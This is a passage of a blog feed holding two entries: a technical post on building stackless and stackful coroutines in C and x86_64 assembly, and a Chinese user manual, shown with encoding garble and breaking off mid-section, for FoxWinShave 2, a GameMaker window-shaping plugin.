    return v;
}

// Stackless coroutine
struct Local {
    int i;
    int v;
};
int f1(int a, int state, struct Local *local, int *out) {
    switch(state) {
        case 0:
            local-&gt;i = 0;
            local-&gt;v = 0;
            return 1;
        case 1:
            if(local-&gt;i &lt; a) {
                local-&gt;v += local-&gt;i;
                local-&gt;i++;
                return 1;
            } else {
                *out = local-&gt;v;
                return -1;
            }
    }
}
</code></pre><p>In the code above, we maintain the execution state of <code>f1</code> outside of itself, therefore allowing recovery of its execution at any point of time as long as we preserve <code>state</code> and <code>local</code>.</p><h2 id="stackful-coroutines">Stackful Coroutines</h2><p>Stackless coroutines are ‚Äústackless‚Äù because they do not explicitly preserve the call stack, while stackful coroutine systems allocate a new call stack for each coroutine. Compared to stackless coroutines, stackful coroutines usually do not need language-level transformations, making it easier to be integrated into different programming languages.</p><p>When the OS switches tasks, it needs to save the machine state of the old task and load the new task‚Äôs one. A machine state contains all used registers, along with in-memory data that should be preserved, e.g. the call stack. As we are going to do coroutine switching in userspace, we have to manually implement the logic for switching machine states.</p><p>For convenience, in this section, we assume that our platform is Linux on a x86_64 machine and we are implementing cooperative scheduling. Therefore, we need to follow the x86_64 System V ABI when dealing with calling conventions. The ABI specifies that the registers <code>rbx</code>, <code>rbp</code>, <code>r12</code>, <code>r13</code>, <code>r14</code> and <code>r15</code> are callee saved, so they must be saved before switching to another coroutine.</p><p>Let‚Äôs start from the coroutine switching function:</p><pre><code>asm(
    "_co_switch:\n"
    "push %rbx\n"
    "push %rbp\n"
    "push %r12\n"
    "push %r13\n"
    "push %r14\n"
    "push %r15\n"
    "mov (%rdi), %rax\n"
    "mov %rsp, (%rdi)\n"
    "mov %rax, %rsp\n"
    "pop %r15\n"
    "pop %r14\n"
    "pop %r13\n"
    "pop %r12\n"
    "pop %rbp\n"
    "pop %rbx\n"
    "ret\n"
);
</code></pre><p>The <code>co_switch</code> function pushes all current callee-saved registers onto the current stack, swaps <code>(%rdi)</code> (the memory pointed to by the first argument, target stack address here) with the stack pointer <code>%rsp</code>, loads the callee-saved registers of the target coroutine, and then executes <code>ret</code> to return in the target coroutine.</p><p>Suppose we have a coroutine <code>A</code> that has just executed the instruction <code>mov %rax, %rsp</code>. At this point, we are sure that the old stack, which is swapped out into memory location <code>(%rdi)</code>, has the following layout (from lower address to higher address):</p><pre><code>[r15] [r14] [r13] [r12] [rbp] [rbx] [return_address]
</code></pre><p>A coroutine can only be switched out with <code>co_switch</code>, so its stack must have the same layout. Therefore, since we are already on the target stack after executing <code>mov %rax, %rsp</code>, we can pop the saved registers in the reverse order, from <code>r15</code> to <code>rbx</code>. Then, the <code>ret</code> instruction is executed, which pops the return address and jumps to it, and the caller code on the target coroutine observes a normal return from <code>co_switch</code>.</p><p>However, we just assumed that we already have a coroutine switched out previously, and some other logic is required for starting a new coroutine.</p><p>We have to construct the stack layout:</p><pre><code>[r15] [r14] [r13] [r12] [rbp] [rbx] [return_address]
</code></pre><p>The values of the saved registers can be arbitrary, since there‚Äôs no old registers to save. To construct a valid ‚Äúreturn‚Äù address, a trampoline is needed:</p><pre><code>asm(
    "_pre_call_entry:\n"
    "pop %rax\n" // entry
    "pop %rdi\n" // userdata
    "call *%rax\n"
    "ud2\n"
);
</code></pre><p><code>pre_call_entry</code> pops a function pointer <code>entry</code> and the associated <code>userdata</code> from the stack, calls <code>entry</code> with <code>userdata</code> as its only argument, then executes <code>ud2</code> to indicate <code>entry</code> should never return. Therefore, we need to include <code>entry</code> and <code>userdata</code> in our stack construction:</p><pre><code>[r15] [r14] [r13] [r12] [rbp] [rbx] [return_address] [entry] [userdata]
</code></pre><p>With the two assembly functions and the expected stack layout, now we can write the code to start a coroutine:</p><pre><code>void co_switch(void **stack);
void pre_call_entry();

struct Coroutine;

typedef void (*CoEntry)(struct Coroutine *co);

struct Coroutine {
    void *stack;
    CoEntry entry;
    int terminated;
};

void call_entry(struct Coroutine *co) {
    co_switch(&amp;co-&gt;stack);
    co-&gt;entry(co);
    co-&gt;terminated = 1;
    co_switch(&amp;co-&gt;stack);
}

void start_coroutine(struct Coroutine *co) {
    void **stack = (void **) co-&gt;stack;

    *(--stack) = co;
    *(--stack) = call_entry; // 16-byte aligned

    *(--stack) = pre_call_entry;

    *(--stack) = 0;
    *(--stack) = 0;
    *(--stack) = 0;
    *(--stack) = 0;
    *(--stack) = 0;
    *(--stack) = 0;

    co-&gt;stack = (void *) stack;

    co_switch(&amp;co-&gt;stack);
}
</code></pre><p>The full example code is available on my <a href="https://gist.github.com/losfair/60af3f0c565470e305b6c021ce57e3dc">GitHub Gist</a>.</p><h1 id="optimizations-and-tricks">Optimizations and Tricks</h1><ul><li><code>ret</code> in <code>co_switch</code> can be replaced by an explicit <code>pop</code> and <code>jmp</code> to avoid <a href="https://stackoverflow.com/questions/22442766/return-address-prediction-stack-buffer-vs-stack-stored-return-address">return address prediction failures</a>.</li><li>If your coroutines are extremely lightweight and usually use a very small space on the stack, we can use a fixed memory region as the execution stack (‚Äúshared stack‚Äù) and copy in/out the used range (<code>stack_end - sp</code>) of the coroutine stack when switching in/out of a coroutine. Although memory copying is needed, this approach can save a lot of memory while still allowing to use guard pages to ensure safety.</li><li>To implement cross-platform stackful coroutines without writing assembly, the <code>pthread_*</code> functions can be used along with <code>setjmp</code> and <code>longjmp</code> to initialize the machine state on a new stack and switch between stacks, without actually using OS threads.</li></ul>]]></content>
        <author>
            <name><![CDATA[The Invariant]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/foxwinshave2.html</id>
        <title><![CDATA[FoxWinShave 2 ‰∏≠Êñá‰ΩøÁî®ÊâãÂÜå]]></title>
        <updated>2019-01-12T08:45:27+08:00</updated>
        <link href="https://www.noisyfox.io/foxwinshave2.html"/>
        <content type="text/html" src="https://www.noisyfox.io/foxwinshave2.html"><![CDATA[<p>FoxWinShave 2 Áé∞Â∑≤‰∏äÊû∂ GameMaker: MarketplaceÔºåÊîØÊåÅ GM8, GMS 1.4 Âíå GMS 2„ÄÇ<a href="https://marketplace.yoyogames.com/assets/7696/foxwinshave" target="_blank" rel="noreferrer noopener" aria-label="ÔºàÂú®Êñ∞Á™óÂè£ÊâìÂºÄÔºâ">ÁÇπÊ≠§‰ªéMarketplace‰∏ãËΩΩÊúÄÊñ∞ÁâàÊú¨</a>„ÄÇ</p>



<hr class="wp-block-separator"/>



<h2>0. ÂâçÁΩÆÊù°‰ª∂</h2>



<ul><li>‰ªÖÊîØÊåÅ Windows Âπ≥Âè∞„ÄÇ</li><li>ÊîØÊåÅ Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10„ÄÇ</li><li>ÊîØÊåÅ GameMaker 7, GameMaker 8, GameMaker 8.1, GameMaker Studio 1.4.x, GameMaker Studio 2 Desktop„ÄÇ</li></ul>



<hr class="wp-block-separator"/>



<h2>1. ÂÆâË£ÖÊèí‰ª∂</h2>



<h3>1.0 GM 7, 8, 8.1</h3>



<p>ËèúÂçïÊ†è File-&gt; Import Resources&#8230; ÈÄâÊã© FoxWinShave-GM8.gmres ÂØºÂÖ•Êèí‰ª∂Âèä Demo„ÄÇ</p>



<ul><li>Âú®ÂºπÂá∫ÁöÑ Importing Resources ÂØπËØùÊ°Ü‰∏≠ÔºåËØ∑Âä°ÂøÖÂãæÈÄâ Scripts Âíå Include Files ‰ª•ÂØºÂÖ•Êèí‰ª∂ËøêË°åÊâÄÂøÖÈ°ªÁöÑÊñá‰ª∂ÂíåËÑöÊú¨„ÄÇ</li><li>Â¶ÇÈúÄÂêåÊó∂ÂØºÂÖ• Demo ‰ª£Á†ÅÂèäÁ¥†ÊùêÔºåËØ∑Â∞Ü SpritesÔºåObjects Âíå Rooms ‰∏ÄÂπ∂ÂãæÈÄâ‰∏ä„ÄÇ</li></ul>



<h3>1.1 GMS 1.4.x Âèä GMS 2 Desktop</h3>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-300x189.png" alt="" class="wp-image-569" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/image-300x189.png 300w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-768x483.png 768w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-1024x644.png 1024w, https://www.noisyfox.io/wp-content/uploads/2019/01/image.png 1588w" sizes="(max-width: 300px) 100vw, 300px" /></a><figcaption>Import resources: FoxWinShave ÂØπËØùÊ°Ü</figcaption></figure></div>



<ol><li>Âú® GameMaker: Marketplace ‰∏äË¥≠‰π∞Êú¨Êèí‰ª∂„ÄÇ<a rel="noreferrer noopener" aria-label="ÔºàÂú®Êñ∞Á™óÂè£ÊâìÂºÄÔºâ" href="https://marketplace.yoyogames.com/assets/7696/foxwinshave" target="_blank">ÔºàÁÇπÊ≠§Ë¥≠‰π∞Ôºâ</a></li><li>Âú® GMS ‰∏≠ËèúÂçïÊ†èÈÄâÊã© Marketplace -&gt; MyLibraryÔºåÊâæÂà∞ FoxWinShaveÔºåÁÇπÂáª Download„ÄÇ</li><li>‰∏ãËΩΩÂÆåÊàêÂêéÔºåÁÇπÂáª Import„ÄÇ</li><li>Âú®ÂºπÂá∫ÁöÑ Import resources: FoxWinShave ÂØπËØùÊ°Ü‰∏≠ÔºåÈÄâ‰∏≠ Scripts Âíå Included FilesÔºåÁÑ∂ÂêéÁÇπÂáª‰∏≠Èó¥ÁöÑ Add ÊåâÈíÆ‰ª•ÂØºÂÖ•Êèí‰ª∂ËøêË°åÊâÄÂøÖÈ°ªÁöÑÊñá‰ª∂ÂíåËÑöÊú¨„ÄÇ</li><li>Â¶ÇÈúÄÂêåÊó∂ÂØºÂÖ• Demo ‰ª£Á†ÅÂèäÁ¥†ÊùêÔºåÈÇ£Â∞±Áõ¥Êé•ÁÇπÂáª‰∏≠Èó¥ÁöÑ Add All ÊåâÈíÆ„ÄÇ</li><li>ÁÇπÂáªÂ∑¶‰∏ãËßí Import ÊåâÈíÆÂÆåÊàêÊèí‰ª∂ÁöÑÂØºÂÖ•„ÄÇ</li></ol>



<hr class="wp-block-separator"/>



<h2>2. Êèí‰ª∂ÂÖ•Èó® 101</h2>



<h3>2.0 Âü∫Á°ÄÂáÜÂ§á</h3>



<p>ËØ∑Âä°ÂøÖÂú®Ê∏∏ÊàèËÆæÁΩÆ‰∏≠Â∞ÜÁ™óÂè£ËÆæÁΩÆ‰∏∫Êó†ËæπÊ°ÜÔºàborderless windowÔºâ:</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image-2.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-2-300x240.png" alt="" class="wp-image-592" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/image-2-300x240.png 300w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-2.png 512w" sizes="(max-width: 300px) 100vw, 300px" /></a><figcaption>GM 8 ËÆæÁΩÆÊó†ËæπÊ°Ü</figcaption></figure></div>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image-1.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-1-300x237.png" alt="" class="wp-image-591" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/image-1-300x237.png 300w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-1.png 695w" sizes="(max-width: 300px) 100vw, 300px" /></a><figcaption>GMS 2 ËÆæÁΩÆÊó†ËæπÊ°Ü</figcaption></figure></div>



<p>Á®çÂêéÂ∞Ü‰ºöËß£ÈáäÈúÄË¶ÅËÆæÁΩÆ‰∏∫Êó†ËæπÊ°ÜÁöÑÂéüÂõ†„ÄÇ</p>



<h3>2.1 Êèí‰ª∂ÂàùÂßãÂåñ</h3>



<p>‰ΩøÁî®Êú¨Êèí‰ª∂ÁöÑ‰ªª‰ΩïËÑöÊú¨ÂâçÈúÄË¶ÅÂÖàËøõË°åÊèí‰ª∂ÁöÑÂàùÂßãÂåñ„ÄÇÂª∫ËÆÆÂú®È¶ñ‰∏™ Room ÁöÑ Creation Code ÂÜÖÊàñËÄÖÊüê‰∏™ÊéßÂà∂Áî®ÁöÑ Object ÁöÑ Game Start ‰∫ã‰ª∂ÈáåÊâßË°åÔºö</p>


<pre class="brush: cpp; title: ; notranslate">
NF_WS_Init();
</pre>


<p>Êèí‰ª∂ÂàùÂßãÂåñÂêéËØ∑ÂãøÂÜçÊ¨°Ë∞ÉÁî®ËØ•ÂáΩÊï∞„ÄÇ</p>



<h3>2.2 Êèí‰ª∂ÈáäÊîæ</h3>



<p>ÂΩì‰∏çÂÜçÈúÄË¶ÅÊõ¥ÊîπÁ™óÂè£ÂΩ¢Áä∂ÂêéÔºåÂèØ‰ª•ÊâßË°å‰ª•‰∏ãÂáΩÊï∞Â∞ÜÊèí‰ª∂Âç∏ËΩΩ‰ª•ÈáäÊîæËµÑÊ∫êÔºö</p>


<pre class="brush: cpp; highlight: [2]; title: ; notranslate">
NF_WS_ResetWindow(); // ÈáçÁΩÆÁ™óÂè£ÂΩ¢Áä∂‰∏∫ÈªòËÆ§ÔºåÈùûÂøÖË¶Å
NF_WS_Free(); // ÈáäÊîæÊèí‰ª∂
</pre>


<p>Âú®ÈáäÊîæÊèí‰ª∂ÂêéÂ¶ÇÊûúÈúÄË¶ÅÂÜçÊ¨°‰ΩøÁî®Êú¨Êèí‰ª∂ÔºåÈúÄË¶ÅÈáçÊñ∞ËøõË°åÊèí‰ª∂ÁöÑÂàùÂßãÂåñ„ÄÇ</p>



<h3>2.3 Âü∫Á°ÄÂéüÁêÜËß£Èáä</h3>



<h4>2.3.0 Á™óÂè£ÂùêÊ†áÁ≥ª</h4>



<p>Â∞ÜÊ∏∏ÊàèÁ™óÂè£ÊÉ≥Ë±°Êàê‰∏Ä‰∏™ÁîªÂ∏ÉÔºåÊåâÁÖßÁ™óÂè£ÁöÑËæπÊ°ÜÂºÄÂßãÁÆóÂ∑¶‰∏äËßíÂùêÊ†á‰∏∫ (0, 0)ÔºåÂè≥‰∏ãËßíËæπÊ°ÜÊúÄÂ§ñÂ§ÑÂùêÊ†á‰∏∫ (viewport_width + Â∑¶ËæπÊ°ÜÂÆΩ + Âè≥ËæπÊ°ÜÂÆΩ, viewport_height + ‰∏äËæπÊ°ÜÈ´ò + ‰∏ãËæπÊ°ÜÈ´ò)ÔºåÂ¶Ç‰∏ãÂõæÊâÄÁ§∫Ôºö</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1.png" alt="" class="wp-image-635" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1.png 574w, https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1-300x234.png 300w" sizes="(max-width: 574px) 100vw, 574px" /></a><figcaption> <br>Á™óÂè£ÂùêÊ†áÁ≥ªÁªü </figcaption></figure></div>



<p>ÁÑ∂ËÄåÈóÆÈ¢òÂú®‰∫éÁ™óÂè£ÁöÑËæπÊ°ÜÂÆΩÂ∫¶ÊòØÁî± Windows Á≥ªÁªüÂÆö‰πâÁöÑÔºå‰∏çÂêå Windows ÁâàÊú¨ÊàñËÄÖ‰∏çÂêåÁöÑ‰∏ªÈ¢òÈÉΩÊúâÂèØËÉΩÂ∏¶Êúâ‰∏çÂêåÂ∞∫ÂØ∏ÁöÑËæπÊ°ÜÔºåÁªôÂú®ÂÆö‰πâÁ™óÂè£ÁöÑÂΩ¢Áä∂Êó∂ËÆ°ÁÆóÂùêÊ†áÂ∏¶Êù•‰∫ÜÈ∫ªÁÉ¶„ÄÇÂõ†Ê≠§Â¶Ç‰∏äÊñáÊâÄËø∞ÔºåËØ∑<strong>Âä°ÂøÖ</strong>Âú®Ê∏∏ÊàèÂÖ®Â±ÄËÆæÁΩÆ‰∏≠ÂÖ≥Èó≠Á™óÂè£ËæπÊ°ÜÁöÑÊòæÁ§∫ÔºåËøôÊ†∑Á™óÂè£ÁöÑÂùêÊ†áÁ≥ªÁªüÂ∞±ÂíåÊ∏∏Êàè View Port ÁöÑÂùêÊ†áÁ≥ªÁªüÁöÑÂéüÁÇπËÉΩÂ§üÁªü‰∏ÄÔºå‰æø‰∫éÂ∞ÜÁ™óÂè£ÂΩ¢Áä∂‰∏éÊ∏∏ÊàèÁªòÂà∂ÂÜÖÂÆπÂØπÈΩê„ÄÇ</p>



<p>‰∏ãÊñáÂú®ÊèèËø∞ÂùêÊ†áÊó∂Â∞ÜÈªòËÆ§‰ΩøÁî®Êó†ËæπÊ°ÜÁ™óÂè£„ÄÇ</p>



<h4>2.3.1 Ê∏∏ÊàèÁªòÂà∂‰∏é View Port</h4>



<p>GM ÊîØÊåÅÂú®‰∏Ä‰∏™Á™óÂè£‰∏≠ÂêåÊó∂ÊòæÁ§∫Â§ö‰∏™ View Port„ÄÇView Port ÁöÑ‰ΩúÁî®ÊòØÂ∞Ü Room ÁöÑ‰∏ÄÈÉ®ÂàÜÂÜÖÂÆπÊåâ‰∏ÄÂÆöÊØî‰æã„ÄÅÁº©ÊîæÂíå‰ΩçÁßªÊò†Â∞ÑÂú®Á™óÂè£‰∏≠ÊòæÁ§∫Âá∫Êù•„ÄÇÁî®Êà∑ÂÆûÈôÖÁúãÂà∞ÁöÑÂÜÖÂÆπÊòØÁªèËøá View Port ÂèòÊç¢ÂêéÁöÑÁªìÊûúÔºåÂπ∂‰∏çÔºà‰∏ÄÂÆöÔºâÊòØÊ∏∏Êàè‰∏≠Ë∞ÉÁî®ÁªòÂà∂‰ª£Á†ÅÊó∂‰ΩøÁî®ÁöÑÂùêÊ†á„ÄÇ</p>



<p>Áî±‰∫éÊàë‰ª¨Âè™ÂÖ≥ÂøÉÁî®Êà∑ÂÆûÈôÖÁúãÂà∞‰∫Ü‰ªÄ‰πàÔºåÂõ†Ê≠§‰∏ãÊñá‰∏≠ÊèêÂà∞ÁöÑ<strong>‚ÄúÊ∏∏ÊàèÁªòÂà∂ÂÜÖÂÆπ‚Äù</strong>ÁöÑÂ∞∫ÂØ∏„ÄÅÂùêÊ†áÔºåÁöÜ‰∏∫ÁªèËøá View Port ÂèòÊç¢ÂêéÊò†Â∞ÑÂà∞Á™óÂè£ÂùêÊ†áÁ≥ª‰∏≠ÁöÑÂ∞∫ÂØ∏ÂíåÂùêÊ†á„ÄÇ</p>



<p>Êõ¥Â§öÂÖ≥‰∫é View Port ÁöÑÂÜÖÂÆπÔºåËØ∑ÂèÇËÄÉ GM ÂÆòÊñπÊñáÊ°£Ôºå‰∏ãÊñáÂ∞Ü‰∏çÂÜçËµòËø∞„ÄÇ</p>



<h4>2.3.2 Á™óÂè£ÂΩ¢Áä∂ÈÅÆÁΩ©</h4>



<p>Êú¨Êèí‰ª∂ÈááÁî®ÈÅÆÁΩ©ÂΩ¢ÂºèËÆæÁΩÆÁ™óÂè£ÂΩ¢Áä∂ÔºåÊîØÊåÅÊ†πÊçÆ Sprite Âíå SurfaceÔºà‰ªÖÈôê GMSÔºâËÆæÁΩÆÁ™óÂè£ÈÅÆÁΩ©„ÄÇ‰ª•‰∏ãÊ†∏ÂøÉÂáΩÊï∞</p>


<pre class="brush: cpp; title: ; notranslate">
NF_WS_ShaveWindow(sprite, subimage, x, y);
NF_WS_ShaveWindowAlpha(sprite, subimage, x, y, alpha);
NF_WS_ShaveWindowExt(sprite, subimage, x, y, xscale, yscale, alpha);
NF_WS_ShaveWindowSurfaceExt(surface, x, y, xscale, yscale, alpha); // ‰ªÖÈôê GMS
</pre>


<p>‰∏é draw_sprite_* Á≥ªÂàóÁªòÂà∂ÂáΩÊï∞ÊúâÁùÄÂçÅÂàÜÁ±ª‰ººÁöÑÂΩ¢ÂºèÔºåÈô§‰∫Ü‰∏çÊîØÊåÅ rot Âíå  <br>colourÂèÇÊï∞ÔºåÂêåÊó∂ alpha ÂèÇÊï∞Êúâ‰∏çÂêåÁöÑÊÑè‰πâ„ÄÇÂèØ‰ª•ÁêÜËß£‰∏∫Â∞ÜÁªôÂÆöÁöÑ Sprite / Surface Áî®Êèê‰æõÁöÑÂèÇÊï∞ÊîæÁΩÆ‰∫éÁ™óÂè£ÂùêÊ†áÁ≥ªÂÜÖ‰Ωú‰∏∫ÈÅÆÁΩ©Ôºà‰∏çÁªèËøá View Port Á≠â‰ªª‰ΩïÂèòÊç¢ÔºâÔºåÂêåÊó∂Â∞ÜÁ™óÂè£Ê≤°ÊúâË¢´ÈÅÆÁΩ©Ë¶ÜÁõñÁöÑÂå∫ÂüüÁªô‚ÄúÊ∂àÂéª‚ÄùÂèò‰∏∫ÈÄèÊòéÔºö</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/mask.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/mask.png" alt="" class="wp-image-654" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/mask.png 640w, https://www.noisyfox.io/wp-content/uploads/2019/01/mask-300x225.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption>‚ÄúÈÅÆÁΩ©Â±Ç‚ÄùÂÜÖÂÆπ</figcaption></figure></div>



<p>Â¶ÇÂõæÊâÄÁ§∫ÔºåÁ∫¢Ëâ≤ÈÉ®ÂàÜÁöÑÁ™óÂè£‰ºöË¢´‰øùÁïô‰∏ãÊù•ÔºåÂÖ∂‰ΩôÈÉ®ÂàÜÂ∞Ü‰ºöË¢´Ê∂àÂéª„ÄÇÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØ‰∏äÂõæÊâÄË∞ìÁöÑ‚ÄúÈÅÆÁΩ©Â±Ç‚ÄùÊòØ‰∏Ä‰∏™‰∏éÁ™óÂè£ÂêåÊ†∑Â§ßÂ∞èÁöÑ‰Ωç‰∫éÁ™óÂè£‰πã‰∏äÁöÑÊÉ≥Ë±°Âá∫ÁöÑ‰∏ÄÂ±ÇÔºåÂπ∂‰∏çÊòØÂÆûÈôÖÂ≠òÂú®ÁöÑÂèØËßÅÂõæÂ±ÇÔºåÂÖ∂ÂÜÖÂÆπ‰ªÖ‰∏∫‰∫Ü‰Ωú‰∏∫ÈÅÆÁΩ©ÊâÄÁî®ÔºåÂπ∂‰∏ç‰ºöÊòæÁ§∫Âá∫Êù•„ÄÇ</p>



<p>ÈÅÆÁΩ©Â±Ç‰ΩøÁî®ÁöÑÂõæÂÉè‰∏∫ÂΩ©Ëâ≤ÂõæÂÉèÂ∏¶ Alpha ÈÄöÈÅì„ÄÇÂú®ÂÆûÈôÖËøêË°åÊó∂Ëâ≤ÂΩ©ÈÄöÈÅì‰ºöË¢´ÂÆåÂÖ®ÂøΩÁï•ÔºåÊúÄÁªàÁ™óÂè£ÂΩ¢Áä∂‰ªÖÂèóÈÅÆÁΩ©Â±ÇÁöÑ Alpha ÈÄöÈÅìÂΩ±Âìç„ÄÇÈªòËÆ§ÊÉÖÂÜµ‰∏ãÊØè‰∏™ Alpha ÈÄöÈÅìÂÄº‰∏∫ 0 ÁöÑÂÉèÁ¥†ÔºàÂç≥Á∫ØÈÄèÊòéÂÉèÁ¥†ÔºâË¢´ËÆ§‰∏∫ÊòØÁ™óÂè£ÈúÄË¶ÅË¢´Ê∂àÂéªÁöÑÈÉ®ÂàÜ„ÄÇËøô‰∏™ÂÄºÂèØ‰ª•ÈÄöËøá‰∏äÊñáÊâÄËø∞ÁöÑÂá†‰∏™ÂáΩÊï∞‰∏≠ÁöÑ alpha ÂèÇÊï∞ÔºàËåÉÂõ¥ [0, 1.0]ÔºâÊù•ÊîπÂèò„ÄÇ‰ªª‰Ωï Alpha ÈÄöÈÅìÂÄº &lt;= ËØ•ÂèÇÊï∞ÁöÑÂÉèÁ¥†Â∞ÜË¢´ËÆ§‰∏∫ÊòØÈúÄË¶ÅÊ∂àÂéªÁöÑ„ÄÇÊ≥®ÊÑèÔºåËøôÊÑèÂë≥ÁùÄÂ¶ÇÊûú‰Ω†‰º†ÂÖ•ÁöÑ alpha ÂèÇÊï∞‰∏∫ 1ÔºåÂàô<strong>‰ªª‰Ωï</strong>ÂÉèÁ¥†ÈÉΩ‰ºöË¢´ËÆ§ÂÆö‰∏∫ÈÄèÊòéÂÉèÁ¥†„ÄÇ</p>



<p>Âè¶Â§ñÔºåÂ¶ÇÊûú‰ΩøÁî® Surface Êù•‰º†ÂÖ•ÈÅÆÁΩ©ÂÜÖÂÆπÔºåËØ∑Ê≥®ÊÑè Surface ÁöÑËÉåÊôØÈúÄË¶ÅÁî®ÈÄèÊòéËâ≤Â°´ÂÖÖÔºö</p>


<pre class="brush: cpp; highlight: [2]; title: ; notranslate">
surface_set_target(mask_surface);
draw_clear_alpha(c_white, 0); // Alpha = 0, ‰ΩøÁî®ÁöÑÈ¢úËâ≤Êó†ÊâÄË∞ì.
</pre>


<h4>2.3.3 ÈÅÆÁΩ©ÂØπÈΩê</h4>



<p>‰ΩøÁî®Êú¨Êèí‰ª∂ÁöÑÁõÆÁöÑÈÄöÂ∏∏ÊòØÊÉ≥Â∞ÜÊ∏∏ÊàèÁ™óÂè£ÁöÑÂΩ¢Áä∂ÔºåË£ÅÂâ™ÊàêÊ∏∏ÊàèÁªòÂà∂ÁöÑÊúâÊÑè‰πâÁöÑÂÜÖÂÆπÁöÑÂΩ¢Áä∂Ôºö</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/purpose.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/purpose-1.png" alt="" class="wp-image-661" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/purpose-1.png 640w, https://www.noisyfox.io/wp-content/uploads/2019/01/purpose-1-300x225.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption>Ê∏∏ÊàèÂÆûÈôÖÁªòÂà∂ÂÜÖÂÆπ</figcaption></figure></div>



<p>‰∏äÂõæ‰∏≠ÔºåÂ•≥Áâõ‰ªîÁöÑÈÉ®ÂàÜÊòØÊúâÊÑè‰πâÁöÑ„ÄÅÈúÄË¶Å‰øùÁïôÁöÑÈÉ®ÂàÜÔºåËÄåÈªëËâ≤ËÉåÊôØÈúÄË¶ÅË¢´Ë£ÅÂâ™ÊéâÔºå‰πüÂ∞±ÊÑèÂë≥ÁùÄÊàë‰ª¨Âú®ÈÅÆÁΩ©Â±Ç‚ÄúÁªòÂà∂‚ÄùÁöÑÈÅÆÁΩ©ÈúÄË¶Å‰∏éÂ•≥Áâõ‰ªîÁöÑ‰ΩçÁΩÆ„ÄÅÂΩ¢Áä∂Áõ∏Âêå„ÄÇ</p>



<p>Ëøô‰πç‰∏ÄÂê¨‰ºº‰πéÂæàÂÆπÊòìÔºåÂè™Ë¶Å‰ΩøÁî®Áõ∏ÂêåÁöÑ xÔºåy ÂèÇÊï∞Â∞ÜÂêåÊ†∑ÁöÑÂ•≥Áâõ‰ªî Sprite ÁªòÂà∂Âà∞ Application Surface ÂíåÈÅÆÁΩ©Â±ÇÂç≥ÂèØ„ÄÇ‰ΩÜÊòØÊ≠£Â¶Ç‰∏äÊñáÊâÄËØ¥ÔºåÁî®Êà∑ÂÆûÈôÖÁúãÂà∞ÁöÑÂÜÖÂÆπÊòØÁªèËøá View Port ÂèòÊç¢ËøáÁöÑÔºåÂõ†Ê≠§ÂÖ∂ÂÆûÈôÖÊòæÁ§∫ÁöÑÂùêÊ†áÂíåÂ∞∫ÂØ∏ÂèØËÉΩ‰∏éÁªòÂà∂Êó∂‰º†ÂÖ•ÁöÑÂèÇÊï∞‰∏çÂêåÔºõÁÑ∂ËÄåÈÅÆÁΩ©Â±ÇÊòØ‰∏çÂèó View Port ÂΩ±ÂìçÁöÑÔºåÂõ†Ê≠§ÂºÄÂèëËÄÖÈúÄË¶ÅËá™Ë°åËÆ°ÁÆóÈÅÆÁΩ©Â±ÇÂõæÂÉèÁöÑ‰ΩçÁΩÆÂíåÂ∞∫ÂØ∏ÔºåÁî®‰ª•ÂØπÈΩêÁªèËøá View Port ÂèòÊç¢ÂêéÁöÑÊ∏∏ÊàèÂÜÖÂÆπ„ÄÇÂª∫ËÆÆ‰∏çË¶ÅÁî®Ëøá‰∫éÂ§çÊùÇÁöÑ View Port ËÆæÁΩÆ„ÄÇ</p>



<h4>2.3.4 Á™óÂè£ÂΩ¢Áä∂Êõ¥Êñ∞Êó∂Èó¥‰∏éÁªòÂà∂‰∫ã‰ª∂È°∫Â∫è</h4>



